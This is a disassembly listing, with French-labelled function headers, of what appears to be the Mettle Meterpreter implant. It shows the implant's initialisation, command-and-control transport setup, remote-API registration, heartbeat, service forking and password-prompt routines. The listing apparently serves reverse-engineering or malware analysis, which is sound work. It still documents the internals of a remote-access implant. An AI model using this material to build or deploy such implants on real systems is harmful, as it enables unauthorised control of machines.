00009b3b: e8a09a0800               call     0x935e0                                    ; free
00009b40: 488b442448               mov      rax, qword ptr [rsp + 0x48]                ; 
00009b45: 4889442440               mov      qword ptr [rsp + 0x40], rax                ; 
00009b4a: eb95                     jmp      0x9ae1                                     ; 
00009b4c: 488b542440               mov      rdx, qword ptr [rsp + 0x40]                ; 
00009b51: 498b36                   mov      rsi, qword ptr [r14]                       ; 
00009b54: 4889ef                   mov      rdi, rbp                                   ; 
00009b57: 4489e1                   mov      ecx, r12d                                  ; 
00009b5a: e8bf120100               call     0x1ae1e                                    ; start_service
00009b5f: 488b7c2440               mov      rdi, qword ptr [rsp + 0x40]                ; 
00009b64: e8779a0800               call     0x935e0                                    ; free
00009b69: 31db                     xor      ebx, ebx                                   ; 
00009b6b: 4881c4d8010000           add      rsp, 0x1d8                                 ; 
00009b72: 89d8                     mov      eax, ebx                                   ; 
00009b74: 5b                       pop      rbx                                        ; 
00009b75: 5d                       pop      rbp                                        ; 
00009b76: 415c                     pop      r12                                        ; 
00009b78: 415d                     pop      r13                                        ; 
00009b7a: 415e                     pop      r14                                        ; 
00009b7c: 415f                     pop      r15                                        ; 
00009b7e: c3                       ret                                                 ; 

argv_split: VA=0xa140, offset=0xa140, taille=245
0000a140: 4154                     push     r12                                        ; 
0000a142: 4889f0                   mov      rax, rsi                                   ; 
0000a145: 55                       push     rbp                                        ; 
0000a146: 31ed                     xor      ebp, ebp                                   ; 
0000a148: 53                       push     rbx                                        ; 
0000a149: 4889d3                   mov      rbx, rdx                                   ; 
0000a14c: 31d2                     xor      edx, edx                                   ; 
0000a14e: 408a37                   mov      sil, byte ptr [rdi]                        ; 
0000a151: 4084f6                   test     sil, sil                                   ; 
0000a154: 0f8493000000             je       0xa1ed                                     ; 
0000a15a: 83fa02                   cmp      edx, 2                                     ; 
0000a15d: 400fb6ce                 movzx    ecx, sil                                   ; 
0000a161: 4c8d6701                 lea      r12, [rdi + 1]                             ; 
0000a165: 742b                     je       0xa192                                     ; 
0000a167: 83fa03                   cmp      edx, 3                                     ; 
0000a16a: 742c                     je       0xa198                                     ; 
0000a16c: 83fa01                   cmp      edx, 1                                     ; 
0000a16f: 8d71f7                   lea      esi, [rcx - 9]                             ; 
0000a172: 742a                     je       0xa19e                                     ; 
0000a174: 83fe04                   cmp      esi, 4                                     ; 
0000a177: 7656                     jbe      0xa1cf                                     ; 
0000a179: 83f920                   cmp      ecx, 0x20                                  ; 
0000a17c: 7451                     je       0xa1cf                                     ; 
0000a17e: 83f922                   cmp      ecx, 0x22                                  ; 
0000a181: 7450                     je       0xa1d3                                     ; 
0000a183: 83f927                   cmp      ecx, 0x27                                  ; 
0000a186: 7455                     je       0xa1dd                                     ; 
0000a188: 4889fd                   mov      rbp, rdi                                   ; 
0000a18b: ba01000000               mov      edx, 1                                     ; 
0000a190: eb53                     jmp      0xa1e5                                     ; 
0000a192: 4080fe22                 cmp      sil, 0x22                                  ; 
0000a196: eb0e                     jmp      0xa1a6                                     ; 
0000a198: 4080fe27                 cmp      sil, 0x27                                  ; 
0000a19c: eb08                     jmp      0xa1a6                                     ; 
0000a19e: 83fe04                   cmp      esi, 4                                     ; 
0000a1a1: 7605                     jbe      0xa1a8                                     ; 
0000a1a3: 83f920                   cmp      ecx, 0x20                                  ; 
0000a1a6: 753d                     jne      0xa1e5                                     ; 
0000a1a8: 41c64424ff00             mov      byte ptr [r12 - 1], 0                      ; 
0000a1ae: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
0000a1b1: 4889c7                   mov      rdi, rax                                   ; 
0000a1b4: 488d34d508000000         lea      rsi, [rdx*8 + 8]                           ; 
0000a1bc: e87f9f0800               call     0x94140                                    ; realloc
0000a1c1: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
0000a1c4: 488d4a01                 lea      rcx, [rdx + 1]                             ; 
0000a1c8: 48890b                   mov      qword ptr [rbx], rcx                       ; 
0000a1cb: 48892cd0                 mov      qword ptr [rax + rdx*8], rbp               ; 
0000a1cf: 31d2                     xor      edx, edx                                   ; 
0000a1d1: eb12                     jmp      0xa1e5                                     ; 
0000a1d3: 4c89e5                   mov      rbp, r12                                   ; 
0000a1d6: ba02000000               mov      edx, 2                                     ; 
0000a1db: eb08                     jmp      0xa1e5                                     ; 
0000a1dd: 4c89e5                   mov      rbp, r12                                   ; 
0000a1e0: ba03000000               mov      edx, 3                                     ; 
0000a1e5: 4c89e7                   mov      rdi, r12                                   ; 
0000a1e8: e961ffffff               jmp      0xa14e                                     ; 
0000a1ed: 85d2                     test     edx, edx                                   ; 
0000a1ef: 7421                     je       0xa212                                     ; 
0000a1f1: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
0000a1f4: 4889c7                   mov      rdi, rax                                   ; 
0000a1f7: 488d34d508000000         lea      rsi, [rdx*8 + 8]                           ; 
0000a1ff: e83c9f0800               call     0x94140                                    ; realloc
0000a204: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
0000a207: 488d4a01                 lea      rcx, [rdx + 1]                             ; 
0000a20b: 48890b                   mov      qword ptr [rbx], rcx                       ; 
0000a20e: 48892cd0                 mov      qword ptr [rax + rdx*8], rbp               ; 
0000a212: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
0000a215: 4889c7                   mov      rdi, rax                                   ; 
0000a218: 488d34d510000000         lea      rsi, [rdx*8 + 0x10]                        ; 
0000a220: e81b9f0800               call     0x94140                                    ; realloc
0000a225: 488b13                   mov      rdx, qword ptr [rbx]                       ; 
0000a228: 48c704d000000000         mov      qword ptr [rax + rdx*8], 0                 ; 
0000a230: 5b                       pop      rbx                                        ; 
0000a231: 5d                       pop      rbp                                        ; 
0000a232: 415c                     pop      r12                                        ; 
0000a234: c3                       ret                                                 ; 

mettle: VA=0x9f22, offset=0x9f22, taille=354
00009f22: 53                       push     rbx                                        ; 
00009f23: be700d0000               mov      esi, 0xd70                                 ; 
00009f28: bf01000000               mov      edi, 1                                     ; 
00009f2d: e8de8f0800               call     0x92f10                                    ; calloc
00009f32: 4885c0                   test     rax, rax                                   ; 
00009f35: 4889c3                   mov      rbx, rax                                   ; 
00009f38: 0f8441010000             je       0xa07f                                     ; 
00009f3e: bf01000003               mov      edi, 0x3000001                             ; 
00009f43: e818efffff               call     0x8e60                                     ; ev_default_loop
00009f48: 488983380d0000           mov      qword ptr [rbx + 0xd38], rax               ; 
00009f4f: 488d058dfdffff           lea      rax, [rip - 0x273]                         ; eio_idle_cb
00009f56: 488d350afdffff           lea      rsi, [rip - 0x2f6]                         ; eio_done_poll
00009f5d: 488d3d21fdffff           lea      rdi, [rip - 0x2df]                         ; eio_want_poll
00009f64: 48c705b1a12d0000000000   mov      qword ptr [rip + 0x2da1b1], 0              ; eio_idle_watcher
00009f6f: c705afa12d0000000000     mov      dword ptr [rip + 0x2da1af], 0              ; 
00009f79: 488905b8a12d00           mov      qword ptr [rip + 0x2da1b8], rax            ; 
00009f80: 488d051cfdffff           lea      rax, [rip - 0x2e4]                         ; eio_async_cb
00009f87: 48c7054ea12d0000000000   mov      qword ptr [rip + 0x2da14e], 0              ; eio_async_watcher
00009f92: c7054ca12d0000000000     mov      dword ptr [rip + 0x2da14c], 0              ; 
00009f9c: 48890555a12d00           mov      qword ptr [rip + 0x2da155], rax            ; 
00009fa3: e834e1ffff               call     0x80dc                                     ; eio_init
00009fa8: 488bbb380d0000           mov      rdi, qword ptr [rbx + 0xd38]               ; 
00009faf: e801090000               call     0xa8b5                                     ; c2_new
00009fb4: 4885c0                   test     rax, rax                                   ; 
00009fb7: 48894320                 mov      qword ptr [rbx + 0x20], rax                ; 
00009fbb: 750f                     jne      0x9fcc                                     ; 
00009fbd: 4889df                   mov      rdi, rbx                                   ; 
00009fc0: 31db                     xor      ebx, ebx                                   ; 
00009fc2: e811ffffff               call     0x9ed8                                     ; mettle_free
00009fc7: e9b3000000               jmp      0xa07f                                     ; 
00009fcc: 488d0d0cfcffff           lea      rcx, [rip - 0x3f4]                         ; on_c2_event
00009fd3: 488d3559fcffff           lea      rsi, [rip - 0x3a7]                         ; on_c2_read
00009fda: 31d2                     xor      edx, edx                                   ; 
00009fdc: 4889c7                   mov      rdi, rax                                   ; 
00009fdf: 4989d8                   mov      r8, rbx                                    ; 
00009fe2: e83a070000               call     0xa721                                     ; c2_set_cbs
00009fe7: 488d7b30                 lea      rdi, [rbx + 0x30]                          ; 
00009feb: e8416f0700               call     0x80f31                                    ; sigar_open
00009ff0: ffc0                     inc      eax                                        ; 
00009ff2: 74c9                     je       0x9fbd                                     ; 
00009ff4: 488bbb380d0000           mov      rdi, qword ptr [rbx + 0xd38]               ; 
00009ffb: e85a0c0100               call     0x1ac5a                                    ; procmgr_new
0000a000: 48894318                 mov      qword ptr [rbx + 0x18], rax                ; 
0000a004: e8cd060100               call     0x1a6d6                                    ; procmgr_setup_env
0000a009: 31c0                     xor      eax, eax                                   ; 
0000a00b: e85c430000               call     0xe36c                                     ; extmgr_new
0000a010: 488b7b30                 mov      rdi, qword ptr [rbx + 0x30]                ; 
0000a014: 488db3380c0000           lea      rsi, [rbx + 0xc38]                         ; 
0000a01b: ba00010000               mov      edx, 0x100                                 ; 
0000a020: 48894308                 mov      qword ptr [rbx + 8], rax                   ; 
0000a024: e874870700               call     0x8279d                                    ; sigar_fqdn_get
0000a029: 488b7b30                 mov      rdi, qword ptr [rbx + 0x30]                ; 
0000a02d: 488d7338                 lea      rsi, [rbx + 0x38]                          ; 
0000a031: e8bb6e0700               call     0x80ef1                                    ; sigar_sys_info_get
0000a036: 488d3da3fbffff           lea      rdi, [rip - 0x45d]                         ; on_tlv_response
0000a03d: 4889de                   mov      rsi, rbx                                   ; 
0000a040: e868810000               call     0x121ad                                    ; tlv_dispatcher_new
0000a045: 4885c0                   test     rax, rax                                   ; 
0000a048: 48894328                 mov      qword ptr [rbx + 0x28], rax                ; 
0000a04c: 0f846bffffff             je       0x9fbd                                     ; 
0000a052: 4889c7                   mov      rdi, rax                                   ; 
0000a055: e838130000               call     0xb392                                     ; channelmgr_new
0000a05a: 4885c0                   test     rax, rax                                   ; 
0000a05d: 488903                   mov      qword ptr [rbx], rax                       ; 
0000a060: 0f8457ffffff             je       0x9fbd                                     ; 
0000a066: 488bbb380d0000           mov      rdi, qword ptr [rbx + 0xd38]               ; 
0000a06d: e8015c0000               call     0xfc73                                     ; modulemgr_new
0000a072: 4885c0                   test     rax, rax                                   ; 
0000a075: 48894310                 mov      qword ptr [rbx + 0x10], rax                ; 
0000a079: 0f843effffff             je       0x9fbd                                     ; 
0000a07f: 4889d8                   mov      rax, rbx                                   ; 
0000a082: 5b                       pop      rbx                                        ; 
0000a083: c3                       ret                                                 ; 

mettle_start: VA=0xa084, offset=0xa084, taille=188
0000a084: 55                       push     rbp                                        ; 
0000a085: 53                       push     rbx                                        ; 
0000a086: 4889fb                   mov      rbx, rdi                                   ; 
0000a089: 488d2d80fcffff           lea      rbp, [rip - 0x380]                         ; mettle_signal_handler
0000a090: 4883ec68                 sub      rsp, 0x68                                  ; 
0000a094: 488bbf380d0000           mov      rdi, qword ptr [rdi + 0xd38]               ; 
0000a09b: 4889e6                   mov      rsi, rsp                                   ; 
0000a09e: 48896c2418               mov      qword ptr [rsp + 0x18], rbp                ; 
0000a0a3: 48c7042400000000         mov      qword ptr [rsp], 0                         ; 
0000a0ab: c744240800000000         mov      dword ptr [rsp + 8], 0                     ; 
0000a0b3: c744242802000000         mov      dword ptr [rsp + 0x28], 2                  ; 
0000a0bb: e887150700               call     0x7b647                                    ; ev_signal_start
0000a0c0: 488bbb380d0000           mov      rdi, qword ptr [rbx + 0xd38]               ; 
0000a0c7: 488d742430               lea      rsi, [rsp + 0x30]                          ; 
0000a0cc: 48896c2448               mov      qword ptr [rsp + 0x48], rbp                ; 
0000a0d1: 48c744243000000000       mov      qword ptr [rsp + 0x30], 0                  ; 
0000a0da: c744243800000000         mov      dword ptr [rsp + 0x38], 0                  ; 
0000a0e2: c74424580f000000         mov      dword ptr [rsp + 0x58], 0xf                ; 
0000a0ea: e858150700               call     0x7b647                                    ; ev_signal_start
0000a0ef: 4889df                   mov      rdi, rbx                                   ; 
0000a0f2: e8b6300000               call     0xd1ad                                     ; tlv_register_coreapi
0000a0f7: 4889df                   mov      rdi, rbx                                   ; 
0000a0fa: e876290000               call     0xca75                                     ; tlv_register_channelapi
0000a0ff: 4889df                   mov      rdi, rbx                                   ; 
0000a102: e8f3d40000               call     0x175fa                                    ; tlv_register_stdapi
0000a107: 488b7b20                 mov      rdi, qword ptr [rbx + 0x20]                ; 
0000a10b: e874060000               call     0xa784                                     ; c2_start
0000a110: 488bbb380d0000           mov      rdi, qword ptr [rbx + 0xd38]               ; 
0000a117: 488d35c29f2d00           lea      rsi, [rip + 0x2d9fc2]                      ; eio_async_watcher
0000a11e: e8ad220700               call     0x7c3d0                                    ; ev_async_start
0000a123: 4889df                   mov      rdi, rbx                                   ; 
0000a126: e821fcffff               call     0x9d4c                                     ; start_heartbeat
0000a12b: 488bbb380d0000           mov      rdi, qword ptr [rbx + 0xd38]               ; 
0000a132: 31f6                     xor      esi, esi                                   ; 
0000a134: e8960d0700               call     0x7aecf                                    ; ev_run
0000a139: 4883c468                 add      rsp, 0x68                                  ; 
0000a13d: 5b                       pop      rbx                                        ; 
0000a13e: 5d                       pop      rbp                                        ; 
0000a13f: c3                       ret                                                 ; 

c2_add_transport_uri: VA=0xa546, offset=0xa546, taille=290
0000a546: 4157                     push     r15                                        ; 
0000a548: 4156                     push     r14                                        ; 
0000a54a: 4531ff                   xor      r15d, r15d                                 ; 
0000a54d: 4155                     push     r13                                        ; 
0000a54f: 4154                     push     r12                                        ; 
0000a551: 4989fd                   mov      r13, rdi                                   ; 
0000a554: 55                       push     rbp                                        ; 
0000a555: 53                       push     rbx                                        ; 
0000a556: 4989f6                   mov      r14, rsi                                   ; 
0000a559: 4883ec08                 sub      rsp, 8                                     ; 
0000a55d: 488b6f08                 mov      rbp, qword ptr [rdi + 8]                   ; 
0000a561: 4885ed                   test     rbp, rbp                                   ; 
0000a564: 0f84eb000000             je       0xa655                                     ; 
0000a56a: 488b7508                 mov      rsi, qword ptr [rbp + 8]                   ; 
0000a56e: 4883c9ff                 or       rcx, 0xffffffffffffffff                    ; 
0000a572: 4488f8                   mov      al, r15b                                   ; 
0000a575: 4889f7                   mov      rdi, rsi                                   ; 
0000a578: f2ae                     repne scasb al, byte ptr [rdi]                         ; 
0000a57a: 4c89f7                   mov      rdi, r14                                   ; 
0000a57d: 48f7d1                   not      rcx                                        ; 
0000a580: 488d51ff                 lea      rdx, [rcx - 1]                             ; 
0000a584: e8879e0900               call     0xa4410                                    ; strncmp
0000a589: 85c0                     test     eax, eax                                   ; 
0000a58b: 4189c4                   mov      r12d, eax                                  ; 
0000a58e: 7406                     je       0xa596                                     ; 
0000a590: 488b6d00                 mov      rbp, qword ptr [rbp]                       ; 
0000a594: ebcb                     jmp      0xa561                                     ; 
0000a596: be38000000               mov      esi, 0x38                                  ; 
0000a59b: bf01000000               mov      edi, 1                                     ; 
0000a5a0: e86b890800               call     0x92f10                                    ; calloc
0000a5a5: 4885c0                   test     rax, rax                                   ; 
0000a5a8: 4889c3                   mov      rbx, rax                                   ; 
0000a5ab: 0f84a4000000             je       0xa655                                     ; 
0000a5b1: 4c89f7                   mov      rdi, r14                                   ; 
0000a5b4: 4c896b20                 mov      qword ptr [rbx + 0x20], r13                ; 
0000a5b8: 48896b28                 mov      qword ptr [rbx + 0x28], rbp                ; 
0000a5bc: e81f9a0900               call     0xa3fe0                                    ; strdup
0000a5c1: 4885c0                   test     rax, rax                                   ; 
0000a5c4: 4989c6                   mov      r14, rax                                   ; 
0000a5c7: 48894310                 mov      qword ptr [rbx + 0x10], rax                ; 
0000a5cb: 7478                     je       0xa645                                     ; 
0000a5cd: 488d358c480a00           lea      rsi, [rip + 0xa488c]                       ; 
0000a5d4: 4889c7                   mov      rdi, rax                                   ; 
0000a5d7: e814a40900               call     0xa49f0                                    ; strstr
0000a5dc: 4885c0                   test     rax, rax                                   ; 
0000a5df: 4889c2                   mov      rdx, rax                                   ; 
0000a5e2: 48894318                 mov      qword ptr [rbx + 0x18], rax                ; 
0000a5e6: 745d                     je       0xa645                                     ; 
0000a5e8: 4883c9ff                 or       rcx, 0xffffffffffffffff                    ; 
0000a5ec: 4889c7                   mov      rdi, rax                                   ; 
0000a5ef: 4488f8                   mov      al, r15b                                   ; 
0000a5f2: f2ae                     repne scasb al, byte ptr [rdi]                         ; 
0000a5f4: 4989cf                   mov      r15, rcx                                   ; 
0000a5f7: 49f7d7                   not      r15                                        ; 
0000a5fa: 49ffcf                   dec      r15                                        ; 
0000a5fd: 4983ff03                 cmp      r15, 3                                     ; 
0000a601: 7642                     jbe      0xa645                                     ; 
0000a603: 4883c203                 add      rdx, 3                                     ; 
0000a607: 48895318                 mov      qword ptr [rbx + 0x18], rdx                ; 
0000a60b: 488b4510                 mov      rax, qword ptr [rbp + 0x10]                ; 
0000a60f: 4885c0                   test     rax, rax                                   ; 
0000a612: 7405                     je       0xa619                                     ; 
0000a614: 4889df                   mov      rdi, rbx                                   ; 
0000a617: ffd0                     call     rax                                        ; 
0000a619: 498b4510                 mov      rax, qword ptr [r13 + 0x10]                ; 
0000a61d: 4885c0                   test     rax, rax                                   ; 
0000a620: 7416                     je       0xa638                                     ; 
0000a622: 488b10                   mov      rdx, qword ptr [rax]                       ; 
0000a625: 48894308                 mov      qword ptr [rbx + 8], rax                   ; 
0000a629: 488913                   mov      qword ptr [rbx], rdx                       ; 
0000a62c: 488918                   mov      qword ptr [rax], rbx                       ; 
0000a62f: 488b03                   mov      rax, qword ptr [rbx]                       ; 
0000a632: 48895808                 mov      qword ptr [rax + 8], rbx                   ; 
0000a636: eb21                     jmp      0xa659                                     ; 
0000a638: 48891b                   mov      qword ptr [rbx], rbx                       ; 
0000a63b: 48895b08                 mov      qword ptr [rbx + 8], rbx                   ; 
0000a63f: 49895d10                 mov      qword ptr [r13 + 0x10], rbx                ; 
0000a643: eb14                     jmp      0xa659                                     ; 
0000a645: 4c89f7                   mov      rdi, r14                                   ; 
0000a648: e8938f0800               call     0x935e0                                    ; free
0000a64d: 4889df                   mov      rdi, rbx                                   ; 
0000a650: e88b8f0800               call     0x935e0                                    ; free
0000a655: 4183ccff                 or       r12d, 0xffffffff                           ; 
0000a659: 5a                       pop      rdx                                        ; 
0000a65a: 4489e0                   mov      eax, r12d                                  ; 
0000a65d: 5b                       pop      rbx                                        ; 
0000a65e: 5d                       pop      rbp                                        ; 
0000a65f: 415c                     pop      r12                                        ; 
0000a661: 415d                     pop      r13                                        ; 
0000a663: 415e                     pop      r14                                        ; 
0000a665: 415f                     pop      r15                                        ; 
0000a667: c3                       ret                                                 ; 

c2_start: VA=0xa784, offset=0xa784, taille=20
0000a784: 4883ec08                 sub      rsp, 8                                     ; 
0000a788: 488d7720                 lea      rsi, [rdi + 0x20]                          ; 
0000a78c: 488b3f                   mov      rdi, qword ptr [rdi]                       ; 
0000a78f: e851010700               call     0x7a8e5                                    ; ev_timer_start
0000a794: 31c0                     xor      eax, eax                                   ; 
0000a796: 5a                       pop      rdx                                        ; 
0000a797: c3                       ret                                                 ; 

transport_cb: VA=0xa451, offset=0xa451, taille=133
0000a451: 53                       push     rbx                                        ; 
0000a452: 488b5e10                 mov      rbx, qword ptr [rsi + 0x10]                ; 
0000a456: 488b7b18                 mov      rdi, qword ptr [rbx + 0x18]                ; 
0000a45a: 4885ff                   test     rdi, rdi                                   ; 
0000a45d: 750d                     jne      0xa46c                                     ; 
0000a45f: 488b7b10                 mov      rdi, qword ptr [rbx + 0x10]                ; 
0000a463: 4885ff                   test     rdi, rdi                                   ; 
0000a466: 48897b18                 mov      qword ptr [rbx + 0x18], rdi                ; 
0000a46a: 7468                     je       0xa4d4                                     ; 
0000a46c: 837b5000                 cmp      dword ptr [rbx + 0x50], 0                  ; 
0000a470: 7516                     jne      0xa488                                     ; 
0000a472: 488b4728                 mov      rax, qword ptr [rdi + 0x28]                ; 
0000a476: 488b4018                 mov      rax, qword ptr [rax + 0x18]                ; 
0000a47a: 4885c0                   test     rax, rax                                   ; 
0000a47d: 7402                     je       0xa481                                     ; 
0000a47f: ffd0                     call     rax                                        ; 
0000a481: c7435001000000           mov      dword ptr [rbx + 0x50], 1                  ; 
0000a488: 837b5003                 cmp      dword ptr [rbx + 0x50], 3                  ; 
0000a48c: 7546                     jne      0xa4d4                                     ; 
0000a48e: 488b7b18                 mov      rdi, qword ptr [rbx + 0x18]                ; 
0000a492: 4885ff                   test     rdi, rdi                                   ; 
0000a495: 7506                     jne      0xa49d                                     ; 
0000a497: 488b4310                 mov      rax, qword ptr [rbx + 0x10]                ; 
0000a49b: eb04                     jmp      0xa4a1                                     ; 
0000a49d: 488b4708                 mov      rax, qword ptr [rdi + 8]                   ; 
0000a4a1: 48894318                 mov      qword ptr [rbx + 0x18], rax                ; 
0000a4a5: 483b7b18                 cmp      rdi, qword ptr [rbx + 0x18]                ; 
0000a4a9: 7429                     je       0xa4d4                                     ; 
0000a4ab: 488b4728                 mov      rax, qword ptr [rdi + 0x28]                ; 
0000a4af: 488b4028                 mov      rax, qword ptr [rax + 0x28]                ; 
0000a4b3: 4885c0                   test     rax, rax                                   ; 
0000a4b6: 7402                     je       0xa4ba                                     ; 
0000a4b8: ffd0                     call     rax                                        ; 
0000a4ba: 488b7b18                 mov      rdi, qword ptr [rbx + 0x18]                ; 
0000a4be: 488b4728                 mov      rax, qword ptr [rdi + 0x28]                ; 
0000a4c2: 488b4018                 mov      rax, qword ptr [rax + 0x18]                ; 
0000a4c6: 4885c0                   test     rax, rax                                   ; 
0000a4c9: 7402                     je       0xa4cd                                     ; 
0000a4cb: ffd0                     call     rax                                        ; 
0000a4cd: c7435001000000           mov      dword ptr [rbx + 0x50], 1                  ; 
0000a4d4: 5b                       pop      rbx                                        ; 
0000a4d5: c3                       ret                                                 ; 

tcp_transport_start: VA=0xb1b5, offset=0xb1b5, taille=18
0000b1b5: 4883ec08                 sub      rsp, 8                                     ; 
0000b1b9: e8bcf5ffff               call     0xa77a                                     ; c2_transport_get_ctx
0000b1be: 488b38                   mov      rdi, qword ptr [rax]                       ; 
0000b1c1: 58                       pop      rax                                        ; 
0000b1c2: e981650000               jmp      0x11748                                    ; network_client_start

network_client_start: VA=0x11748, offset=0x11748, taille=20
00011748: 4883ec08                 sub      rsp, 8                                     ; 
0001174c: 4889fe                   mov      rsi, rdi                                   ; 
0001174f: 488b7f30                 mov      rdi, qword ptr [rdi + 0x30]                ; 
00011753: e88d910600               call     0x7a8e5                                    ; ev_timer_start
00011758: 31c0                     xor      eax, eax                                   ; 
0001175a: 5a                       pop      rdx                                        ; 
0001175b: c3                       ret                                                 ; 

start_service: VA=0x1ae1e, offset=0x1ae1e, taille=13
0001ae1e: 85c9                     test     ecx, ecx                                   ; 
0001ae20: 7505                     jne      0x1ae27                                    ; 
0001ae22: e957feffff               jmp      0x1ac7e                                    ; fork_service
0001ae27: 83c8ff                   or       eax, 0xffffffff                            ; 
0001ae2a: c3                       ret                                                 ; 

sigar_password_get: VA=0x82d03, offset=0x82d03, taille=86
00082d03: 4154                     push     r12                                        ; 
00082d05: 488d35308b0300           lea      rsi, [rip + 0x38b30]                       ; 
00082d0c: 55                       push     rbp                                        ; 
00082d0d: 4989fc                   mov      r12, rdi                                   ; 
00082d10: 53                       push     rbx                                        ; 
00082d11: 488d3daa7e0300           lea      rdi, [rip + 0x37eaa]                       ; 
00082d18: 31ed                     xor      ebp, ebp                                   ; 
00082d1a: e846d10100               call     0x9fe65                                    ; fopen64
00082d1f: 4885c0                   test     rax, rax                                   ; 
00082d22: 742d                     je       0x82d51                                    ; 
00082d24: 4889c3                   mov      rbx, rax                                   ; 
00082d27: 4889c6                   mov      rsi, rax                                   ; 
00082d2a: 4c89e7                   mov      rdi, r12                                   ; 
00082d2d: e8ffd20100               call     0xa0031                                    ; fputs
00082d32: 4889df                   mov      rdi, rbx                                   ; 
00082d35: e807ce0100               call     0x9fb41                                    ; fflush_unlocked
00082d3a: 488d3ddd570300           lea      rdi, [rip + 0x357dd]                       ; 
00082d41: e805fc0000               call     0x9294b                                    ; getpass
00082d46: 4889df                   mov      rdi, rbx                                   ; 
00082d49: 4889c5                   mov      rbp, rax                                   ; 
00082d4c: e8dacc0100               call     0x9fa2b                                    ; fclose
00082d51: 4889e8                   mov      rax, rbp                                   ; 
00082d54: 5b                       pop      rbx                                        ; 
00082d55: 5d                       pop      rbp                                        ; 
00082d56: 415c                     pop      r12                                        ; 
00082d58: c3                       ret                                                 ; 
